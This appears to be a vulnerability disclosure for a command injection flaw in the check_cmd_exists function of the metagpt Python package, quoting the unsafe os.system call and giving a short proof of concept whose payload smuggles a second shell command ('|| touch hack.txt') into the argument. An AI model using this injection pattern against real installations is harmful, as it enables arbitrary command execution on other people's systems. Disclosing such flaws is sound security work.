# Command Injection in metagpt(PyPI)
## Basic information
Author: Chuanhao Wan(wanchuanhao@hust.edu.cn)

Vulnerable pypi package: metagpt

Npm url: https://pypi.org/project/metagpt/

Github url: https://github.com/geekan/MetaGPT

Affected version: <=0.8.1

Vulnerable file: metagpt/utils/common.py

The vulnerable function(line 45-55) in the vulnerable file is:
```python
def check_cmd_exists(command) -> int:
    """检查命令是否存在
    :param command: 待检查的命令
    :return: 如果命令存在，返回0，如果不存在，返回非0
    """
    if platform.system().lower() == "windows":
        check_command = "where " + command
    else:
        check_command = "command -v " + command + ' >/dev/null 2>&1 || { echo >&2 "no mermaid"; exit 1; }'
    result = os.system(check_command)
    return result
```
Command injection vulnerability can be triggered in ```check_cmd_exists``` function at line 54 in the file, because the argument  ```command``` is not checked and validated before being executed.

## Exploit
Environment prepare: Linux, python 3.9+, ```pip install metagpt```

exploit.py:
```python
import metagpt.utils.common as c

payload = 'bcudsvcutgqvec || touch hack.txt'
c.check_cmd_exists(payload)
```
Run ```python exploit.py```, the ```payload``` will be executed and create a ```hack.txt``` file in work folder.
Almost all commands can be encapsulated within the payload for execution.
